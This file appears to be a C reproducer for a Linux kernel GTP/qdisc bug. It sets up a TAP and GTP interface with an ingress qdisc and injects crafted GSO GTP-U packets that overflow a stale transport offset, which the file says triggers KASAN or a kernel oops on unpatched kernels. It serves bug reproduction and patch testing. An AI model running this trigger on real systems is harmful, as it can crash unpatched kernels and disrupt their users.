/*
 * qdisc_uaf_gtp_repro.c
 *
 * Userspace GTP reproducer for the qdisc_pkt_len_segs_init() stale
 * transport_header bug.
 *
 * Trigger path:
 *
 *   tun_get_user -> __netif_receive_skb_core -> udp socket (2152)
 *   -> gtp_encap_recv -> gtp_rx -> iptunnel_pull_header()
 *   -> __netif_rx(gtp0) -> __netif_receive_skb_core
 *   -> sch_handle_ingress (ingress qdisc on gtp0)
 *   -> qdisc_pkt_len_segs_init()
 *
 * Topology:
 *   /dev/net/tap (syz_tap) -> gtp0 (role sgsn, ingress qdisc)
 *
 * The TAP device injects a GSO UDP-tunnel packet: an Ethernet/IPv4/UDP/GTP-U
 * frame carrying an inner IPv4/TCP payload.  After GTP decapsulation
 * (gtp_rx pulls 16 bytes: UDP + GTP-U v1 header) the inner frame still
 * carries the outer UDP tunnel GSO metadata and a stale transport_header
 * pointing at the outer UDP header (now a -16 offset).  The ingress qdisc on
 * gtp0 enters qdisc_pkt_len_segs_init(), which overflows the negative
 * transport offset and triggers KASAN / a kernel oops on an unpatched
 * kernel.  With skb_unset_transport_header() in gtp_rx() the header is
 * cleared before delivery and the path is safe.
 *
 * Note: gtp is an L3 tunnel, the inner frame is a plain IPv4 packet (no
 * Ethernet header).  A PDP context with ms_addr matching the inner daddr
 * must exist (ip gtp add pdp).
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <sched.h>
#include <stddef.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/virtio_net.h>
#include <linux/genetlink.h>
#include <linux/gtp.h>
#include <linux/netlink.h>

#define TUN_F_CSUM		0x01
#define TUN_F_USO4		0x20
#define TUN_F_USO6		0x40
#define TUN_F_UDP_TUNNEL_GSO	0x080
#define TUN_F_UDP_TUNNEL_GSO_CSUM	0x100

#ifndef VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV4
#define VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV4 0x20
#endif

struct my_virtio_net_hdr_v1_hash_tunnel {
	uint8_t flags;
	uint8_t gso_type;
	uint16_t hdr_len;
	uint16_t gso_size;
	uint16_t csum_start;
	uint16_t csum_offset;
	uint32_t hash_value;
	uint16_t hash_report;
	uint16_t padding;
	uint16_t outer_th_offset;
	uint16_t inner_nh_offset;
};

#define TAP_IFNAME	"syz_tap"
#define GTP_IFNAME	"gtp0"

#define GTP_PORT	2152
#define GTP_TID		42
#define MS_ADDR		"10.0.0.1"
#define GTP_ROLE	"sgsn"

#define TAP_LOCAL_MAC	"02:00:00:00:00:01"
#define TAP_IP		"10.0.0.1"

#define PKT_LEN		200

struct gtp1_header {
	uint8_t	flags;
	uint8_t	type;
	uint16_t length;
	uint32_t tid;
} __attribute__((packed));

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[1024];
	va_list ap;
	int ret;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	ret = system(cmd);
	if (ret != 0) {
		fprintf(stderr, "command failed (%d): %s\n", ret, cmd);
		exit(EXIT_FAILURE);
	}
}

static int open_tap(const char *ifname)
{
	struct ifreq ifr;
	int fd, vnet_hdr_sz;

	fd = open("/dev/net/tun", O_RDWR);
	if (fd < 0)
		die("open(/dev/net/tun)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_VNET_HDR | IFF_TUN_EXCL;
	if (ioctl(fd, TUNSETIFF, &ifr) < 0)
		die("ioctl(TUNSETIFF)");

	/* v1 hash tunnel header: lets the tun guess that the guest supports
	 * UDP tunnel GSO, so the combined TCPV4|UDP_TUNNEL gso_type below
	 * survives until the UDP encap receive path.
	 */
	vnet_hdr_sz = sizeof(struct my_virtio_net_hdr_v1_hash_tunnel);
	if (ioctl(fd, TUNSETVNETHDRSZ, &vnet_hdr_sz) < 0)
		die("ioctl(TUNSETVNETHDRSZ)");

	return fd;
}

static uint16_t ip_checksum(uint16_t *buf, int nwords)
{
	uint32_t sum = 0;

	for (int i = 0; i < nwords; i++)
		sum += buf[i];
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (uint16_t)(~sum);
}

static int nl_sock = -1;
static uint32_t nl_seq;
static uint16_t gtp_genl_family_id;

#ifndef NLA_OK
#define NLA_OK(nla, len) ((len) >= (int)sizeof(struct nlattr) && \
			  (nla)->nla_len >= sizeof(struct nlattr) && \
			  (nla)->nla_len <= (len))
#endif
#ifndef NLA_NEXT
#define NLA_NEXT(nla, attrlen) ((attrlen) -= NLA_ALIGN((nla)->nla_len), \
				(struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#endif
static inline uint16_t nla_get_u16(const struct nlattr *nla)
{
	return *(const uint16_t *)((const char *)nla + NLA_HDRLEN);
}

static void nl_transact(struct nlmsghdr *nlh, uint8_t *reply, size_t reply_sz)
{
	struct sockaddr_nl addr = { .nl_family = AF_NETLINK };

	if (sendto(nl_sock, nlh, nlh->nlmsg_len, 0,
		   (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("netlink sendto");

	for (;;) {
		ssize_t n = recv(nl_sock, reply, reply_sz, 0);
		struct nlmsghdr *rh;

		if (n < 0)
			die("netlink recv");
		for (rh = (struct nlmsghdr *)reply; NLMSG_OK(rh, n);
		     rh = NLMSG_NEXT(rh, n)) {
			if (rh->nlmsg_seq != nlh->nlmsg_seq)
				continue;
			if (rh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(rh);

				if (err->error) {
					fprintf(stderr, "netlink error: %d (%s)\n",
						err->error, strerror(-err->error));
					exit(EXIT_FAILURE);
				}
			}
			if (rh->nlmsg_seq == nlh->nlmsg_seq)
				return;
		}
	}
}

static void genl_family_resolve(void)
{
	struct {
		struct nlmsghdr nlh;
		struct genlmsghdr genlh;
		struct nlattr attr;
		char name[8];
	} msg;
	uint8_t reply[1024];
	struct nlmsghdr *rh;
	int rem, attrlen;
	ssize_t n;

	memset(&msg, 0, sizeof(msg));
	msg.nlh.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
	msg.nlh.nlmsg_type = GENL_ID_CTRL;
	msg.nlh.nlmsg_flags = NLM_F_REQUEST;
	msg.nlh.nlmsg_seq = ++nl_seq;
	msg.genlh.cmd = CTRL_CMD_GETFAMILY;
	msg.genlh.version = 1;
	msg.attr.nla_type = CTRL_ATTR_FAMILY_NAME;
	msg.attr.nla_len = NLA_HDRLEN + sizeof("gtp");
	memcpy(msg.name, "gtp", sizeof("gtp"));
	msg.nlh.nlmsg_len = NLMSG_ALIGN(NLMSG_LENGTH(GENL_HDRLEN)) +
			    NLA_ALIGN(msg.attr.nla_len);

	nl_transact(&msg.nlh, reply, sizeof(reply));

	n = (ssize_t)((struct nlmsghdr *)reply)->nlmsg_len;
	for (rh = (struct nlmsghdr *)reply; NLMSG_OK(rh, n); rh = NLMSG_NEXT(rh, n)) {
		struct genlmsghdr *genlh;

		if (rh->nlmsg_seq != msg.nlh.nlmsg_seq)
			continue;
		genlh = NLMSG_DATA(rh);
		attrlen = rh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
		for (struct nlattr *a = (struct nlattr *)((char *)genlh + GENL_HDRLEN);
		     NLA_OK(a, attrlen); a = NLA_NEXT(a, attrlen)) {
			if (a->nla_type == CTRL_ATTR_FAMILY_ID) {
				gtp_genl_family_id = nla_get_u16(a);
				printf("gtp genl family id: %u\n", gtp_genl_family_id);
				return;
			}
		}
	}
	fprintf(stderr, "failed to resolve gtp genl family\n");
	exit(EXIT_FAILURE);
}

static void gtp_add_pdp(int ifindex, uint32_t i_tei, const char *ms_addr)
{
	struct {
		struct nlmsghdr nlh;
		struct genlmsghdr genlh;
		char attrs[128];
	} msg;
	struct nlattr *a;
	size_t off;
	uint32_t version = GTP_V1;
	struct in_addr ms;

	if (inet_pton(AF_INET, ms_addr, &ms) != 1)
		die("inet_pton ms_addr");

	memset(&msg, 0, sizeof(msg));
	msg.nlh.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
	msg.nlh.nlmsg_type = gtp_genl_family_id;
	msg.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	msg.nlh.nlmsg_seq = ++nl_seq;
	msg.genlh.cmd = GTP_CMD_NEWPDP;
	msg.genlh.version = 1;

	off = NLMSG_ALIGN(NLMSG_LENGTH(GENL_HDRLEN));

	a = (struct nlattr *)((char *)&msg + off);
	a->nla_type = GTPA_LINK;
	a->nla_len = NLA_HDRLEN + sizeof(uint32_t);
	memcpy((char *)a + NLA_HDRLEN, &ifindex, sizeof(ifindex));
	off += NLA_ALIGN(a->nla_len);

	a = (struct nlattr *)((char *)&msg + off);
	a->nla_type = GTPA_VERSION;
	a->nla_len = NLA_HDRLEN + sizeof(uint32_t);
	memcpy((char *)a + NLA_HDRLEN, &version, sizeof(version));
	off += NLA_ALIGN(a->nla_len);

	a = (struct nlattr *)((char *)&msg + off);
	a->nla_type = GTPA_I_TEI;
	a->nla_len = NLA_HDRLEN + sizeof(uint32_t);
	memcpy((char *)a + NLA_HDRLEN, &i_tei, sizeof(i_tei));
	off += NLA_ALIGN(a->nla_len);

	a = (struct nlattr *)((char *)&msg + off);
	a->nla_type = GTPA_O_TEI;
	a->nla_len = NLA_HDRLEN + sizeof(uint32_t);
	memcpy((char *)a + NLA_HDRLEN, &i_tei, sizeof(i_tei));
	off += NLA_ALIGN(a->nla_len);

	a = (struct nlattr *)((char *)&msg + off);
	a->nla_type = GTPA_PEER_ADDRESS;
	a->nla_len = NLA_HDRLEN + sizeof(uint32_t);
	memcpy((char *)a + NLA_HDRLEN, &ms, sizeof(ms));
	off += NLA_ALIGN(a->nla_len);

	a = (struct nlattr *)((char *)&msg + off);
	a->nla_type = GTPA_MS_ADDRESS;
	a->nla_len = NLA_HDRLEN + sizeof(uint32_t);
	memcpy((char *)a + NLA_HDRLEN, &ms, sizeof(ms));
	off += NLA_ALIGN(a->nla_len);

	msg.nlh.nlmsg_len = off;

	{
		uint8_t reply[1024];

		nl_transact(&msg.nlh, reply, sizeof(reply));
	}
	printf("PDP context added: dev ifindex=%d i_tei=%u ms_addr=%s\n",
	       ifindex, i_tei, ms_addr);
}

static int setup_topology(void)
{
	int tap_fd;

	run_cmd("ip link del %s >/dev/null 2>&1 || true", TAP_IFNAME);

	tap_fd = open_tap(TAP_IFNAME);

	run_cmd("ip addr flush dev %s 2>/dev/null || true", TAP_IFNAME);
	run_cmd("ip addr replace %s/24 dev %s", TAP_IP, TAP_IFNAME);
	run_cmd("ip link set %s up", TAP_IFNAME);
	run_cmd("ip link set %s address %s", TAP_IFNAME, TAP_LOCAL_MAC);

	run_cmd("ip link del %s >/dev/null 2>&1 || true", GTP_IFNAME);
	run_cmd("ip link add %s type gtp role %s", GTP_IFNAME, GTP_ROLE);
	run_cmd("ip link set %s up", GTP_IFNAME);

	nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (nl_sock < 0)
		die("socket(NETLINK_GENERIC)");
	genl_family_resolve();
	gtp_add_pdp(if_nametoindex(GTP_IFNAME), GTP_TID, MS_ADDR);

	/* Activate the ingress TC path so that qdisc_pkt_len_segs_init()
	 * runs inside __netif_receive_skb_core() on gtp0.
	 */
	run_cmd("tc qdisc add dev %s handle ffff: ingress", GTP_IFNAME);

	return tap_fd;
}

static size_t build_packet(uint8_t *buf, size_t len)
{
	struct ethhdr *eth;
	struct iphdr *ip;
	struct udphdr *udp;
	struct gtp1_header *gtp1;
	struct iphdr *iip;
	struct tcphdr *tcp;
	uint8_t *payload;
	size_t off;

	memset(buf, 0, len);

	eth = (struct ethhdr *)buf;
	memset(eth->h_dest, 0xff, ETH_ALEN);
	memset(eth->h_source, 0x02, ETH_ALEN);
	eth->h_source[5] = 0x01;
	eth->h_proto = htons(ETH_P_IP);
	off = ETH_HLEN;

	ip = (struct iphdr *)(buf + off);
	ip->version = 4;
	ip->ihl = 5;
	ip->tot_len = htons(len - ETH_HLEN);
	ip->ttl = 64;
	ip->protocol = IPPROTO_UDP;
	ip->saddr = inet_addr("10.0.0.2");
	ip->daddr = inet_addr(TAP_IP);
	ip->check = ip_checksum((uint16_t *)ip, sizeof(*ip) / 2);
	off += sizeof(*ip);

	udp = (struct udphdr *)(buf + off);
	udp->source = htons(5000);
	udp->dest = htons(GTP_PORT);
	udp->len = htons(len - off - sizeof(*udp));
	udp->check = 0;
	off += sizeof(*udp);

	gtp1 = (struct gtp1_header *)(buf + off);
	gtp1->flags = 0x30;	/* v1, GTP-non-prime */
	gtp1->type = 0xff;	/* GTP_TPDU */
	gtp1->length = htons(len - off - sizeof(*gtp1));
	gtp1->tid = htonl(GTP_TID);
	off += sizeof(*gtp1);

	/* Inner IPv4/TCP (no Ethernet header: gtp is an L3 tunnel). */
	iip = (struct iphdr *)(buf + off);
	iip->version = 4;
	iip->ihl = 5;
	iip->tot_len = htons(len - off);
	iip->ttl = 64;
	iip->protocol = IPPROTO_TCP;
	iip->saddr = inet_addr("8.8.8.8");
	iip->daddr = inet_addr(MS_ADDR);
	iip->check = ip_checksum((uint16_t *)iip, sizeof(*iip) / 2);
	off += sizeof(*iip);

	tcp = (struct tcphdr *)(buf + off);
	tcp->source = htons(12345);
	tcp->dest = htons(54321);
	tcp->seq = htonl(0x01020304);
	tcp->ack_seq = htonl(0x05060708);
	tcp->doff = 5;
	tcp->check = 0;
	tcp->urg_ptr = 0;
	off += sizeof(*tcp);

	payload = buf + off;
	for (size_t i = 0; i < len - off; i++)
		payload[i] = (uint8_t)(i & 0xff);

	return len;
}

static size_t build_write_buffer(uint8_t **out, int nogso)
{
	struct my_virtio_net_hdr_v1_hash_tunnel *tnl;
	struct virtio_net_hdr *vhdr;
	uint8_t *buf;
	size_t total_len;

	total_len = sizeof(*tnl) + PKT_LEN;

	buf = calloc(1, total_len);
	if (!buf)
		die("calloc");

	tnl = (struct my_virtio_net_hdr_v1_hash_tunnel *)buf;
	vhdr = (struct virtio_net_hdr *)tnl;

	if (!nogso) {
		vhdr->flags = VIRTIO_NET_HDR_F_NEEDS_CSUM;
		/* Combined type: tun maps this to SKB_GSO_TCPV4 plus the
		 * UDP tunnel GSO bits so that udp_unexpected_gso() lets the
		 * GSO skb reach the GTP encap receive path untouched.
		 */
		vhdr->gso_type = VIRTIO_NET_HDR_GSO_TCPV4 |
				 VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV4;
		vhdr->hdr_len = htole16(ETH_HLEN + sizeof(struct iphdr) +
					sizeof(struct udphdr) + sizeof(struct gtp1_header) +
					sizeof(struct iphdr) + sizeof(struct tcphdr));
		vhdr->gso_size = htole16(4);
		vhdr->csum_start = htole16(ETH_HLEN + sizeof(struct iphdr) +
					  sizeof(struct udphdr) + sizeof(struct gtp1_header) +
					  sizeof(struct iphdr));
		vhdr->csum_offset = htole16(offsetof(struct tcphdr, check));

		/* Tunnel offsets are relative to the start of the outer MAC
		 * header. The inner payload has no Ethernet header (GTP is an
		 * L3 tunnel), so inner_nh_offset points at the inner IPv4.
		 */
		tnl->outer_th_offset = htole16(ETH_HLEN + sizeof(struct iphdr));
		tnl->inner_nh_offset = htole16(ETH_HLEN + sizeof(struct iphdr) +
					      sizeof(struct udphdr) + sizeof(struct gtp1_header));
	}

	build_packet(buf + sizeof(*tnl), PKT_LEN);

	*out = buf;
	return total_len;
}

int main(int argc, char *argv[])
{
	uint8_t *buf = NULL;
	size_t total_len;
	int tap_fd;
	int nogso = 0;

	if (getuid() != 0) {
		fprintf(stderr, "this reproducer must be run as root\n");
		return EXIT_FAILURE;
	}

	if (argc > 1 && !strcmp(argv[1], "nounshare")) {
		printf("running in current netns\n");
	} else {
		if (unshare(CLONE_NEWNET) < 0)
			die("unshare(CLONE_NEWNET)");
		run_cmd("ip link set lo up");
	}
	if (argc > 1 && !strcmp(argv[1], "nogso"))
		nogso = 1;

	run_cmd("ip link set lo up");

	tap_fd = setup_topology();
	total_len = build_write_buffer(&buf, nogso);

	printf("write_len: %zu\n", total_len);
	printf("topology: tap(%s) -> gtp(%s) ingress qdisc\n", TAP_IFNAME, GTP_IFNAME);
	printf("outer: Ethernet/IPv4/UDP/GTP-U v1 (GSO TCPv4)\n");
	printf("inner: IPv4/TCP\n");
	run_cmd("ip link show %s", GTP_IFNAME);

	printf("sending via /dev/net/tap bound to %s...\n", TAP_IFNAME);
	run_cmd("grep -E '^Ip:|^Udp:' /proc/net/snmp");
	run_cmd("ip -s link show %s", TAP_IFNAME);

	for (int i = 0; i < 10; i++) {
		if (write(tap_fd, buf, total_len) != (ssize_t)total_len)
			die("write tap");
		printf("write[%d] ok\n", i);
	}

	run_cmd("grep -E '^Ip:|^Udp:' /proc/net/snmp");
	run_cmd("ip -s link show %s", TAP_IFNAME);

	run_cmd("ip -s link show %s", GTP_IFNAME);
	run_cmd("cat /proc/net/snmp | grep -E '^Ip:|^Udp:'");

	printf("linger: 5 seconds\n");
	sleep(5);

	run_cmd("ip -s link show %s", GTP_IFNAME);
	run_cmd("cat /proc/net/snmp | grep -E '^Ip:|^Udp:'");
	run_cmd("dmesg | tail -20");

	free(buf);
	close(tap_fd);
	return 0;
}
